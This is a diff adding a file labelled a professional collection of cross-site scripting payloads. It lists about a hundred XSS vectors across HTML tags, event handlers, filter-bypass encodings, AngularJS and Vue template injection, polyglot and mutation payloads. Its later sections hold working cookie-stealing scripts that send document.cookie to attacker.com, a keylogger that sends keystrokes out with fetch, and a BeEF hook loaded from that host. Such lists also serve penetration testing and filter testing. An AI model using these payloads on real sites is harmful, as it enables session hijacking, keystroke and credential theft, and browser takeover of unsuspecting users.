@@ -1,0 +1,120 @@
+# Cross-Site Scripting (XSS) Payloads
+# Professional collection of XSS attack vectors
+
+# Basic XSS
+<script>alert('XSS')</script>
+<script>alert(1)</script>
+<script>alert(document.cookie)</script>
+<script>alert(document.domain)</script>
+<script>alert(window.origin)</script>
+
+# Image-Based XSS
+<img src=x onerror=alert('XSS')>
+<img src=x onerror=alert(1)>
+<img src=x onerror=alert(document.cookie)>
+<img src="javascript:alert('XSS')">
+<img src=x:alert(1) onerror=eval(src)>
+
+# SVG-Based XSS
+<svg onload=alert('XSS')>
+<svg/onload=alert(1)>
+<svg><script>alert('XSS')</script></svg>
+<svg><animate onbegin=alert(1)>
+
+# Body/Input Events
+<body onload=alert('XSS')>
+<input onfocus=alert('XSS') autofocus>
+<select onfocus=alert('XSS') autofocus>
+<textarea onfocus=alert('XSS') autofocus>
+<keygen onfocus=alert('XSS') autofocus>
+
+# IFrame-Based
+<iframe src="javascript:alert('XSS')">
+<iframe src=data:text/html,<script>alert('XSS')</script>>
+<iframe srcdoc="<script>alert('XSS')</script>">
+
+# Object/Embed
+<object data="javascript:alert('XSS')">
+<embed src="javascript:alert('XSS')">
+
+# Link-Based
+<a href="javascript:alert('XSS')">Click</a>
+<link rel="import" href="data:text/html,<script>alert('XSS')</script>">
+
+# Form-Based
+<form action="javascript:alert('XSS')"><input type="submit">
+<button formaction="javascript:alert('XSS')">
+
+# Video/Audio
+<video src=x onerror=alert('XSS')>
+<audio src=x onerror=alert('XSS')>
+
+# Table-Based
+<table background="javascript:alert('XSS')">
+
+# Div/Span Events
+<div onmouseover=alert('XSS')>Hover me</div>
+<span onclick=alert('XSS')>Click me</span>
+
+# Filter Bypass - No Parentheses
+<script>alert`XSS`</script>
+<script>eval.call`${'alert\x281\x29'}`</script>
+
+# Filter Bypass - No Quotes
+<script>alert(String.fromCharCode(88,83,83))</script>
+
+# Filter Bypass - Mixed Case
+<ScRiPt>alert('XSS')</sCrIpT>
+
+# Filter Bypass - Encoding
+<script>alert('XSS')</script>
+&#60;script&#62;alert('XSS')&#60;/script&#62;
+\x3cscript\x3ealert('XSS')\x3c/script\x3e
+
+# DOM-Based XSS
+<img src=x onerror=this.src='http://attacker.com/?c='+document.cookie>
+<script>document.location='http://attacker.com/?c='+document.cookie</script>
+
+# AngularJS Template Injection
+{{constructor.constructor('alert(1)')()}}
+{{7*7}}
+{{$on.constructor('alert(1)')()}}
+
+# Vue.js Template Injection
+{{_c.constructor('alert(1)')()}}
+
+# React XSS
+<div dangerouslySetInnerHTML={{__html: '<img src=x onerror=alert(1)>'}}></div>
+
+# Polyglot XSS
+javascript:/*--></title></style></textarea></script></xmp><svg/onload='+/"/+/onmouseover=1/+/[*/[]/+alert(1)//'>
+
+# Cookie Stealing
+<script>new Image().src='http://attacker.com/steal?c='+document.cookie;</script>
+<script>fetch('http://attacker.com/steal?c='+document.cookie)</script>
+
+# Keylogger
+<script>document.onkeypress=function(e){fetch('http://attacker.com/log?k='+e.key)}</script>
+
+# BeEF Hook (Browser Exploitation Framework)
+<script src="http://attacker.com/hook.js"></script>
+
+# Mutation XSS
+<noscript><p title="</noscript><img src=x onerror=alert(1)>">
+
+# Markdown XSS
+[Click me](javascript:alert('XSS'))
+![XSS](javascript:alert('XSS'))
+
+# CSS-Based XSS
+<style>*{background:url('javascript:alert(1)')}</style>
+<link rel=stylesheet href="data:,*%7Bbackground:url('javascript:alert(1)')%7D">
+
+# Meta Refresh
+<meta http-equiv="refresh" content="0;url=javascript:alert('XSS')">
+
+# Data URI
+<a href="data:text/html,<script>alert('XSS')</script>">Click</a>
+
+# XML/RSS XSS
+<rss version="2.0"><channel><title><![CDATA[<script>alert('XSS')</script>]]></title></channel></rss>
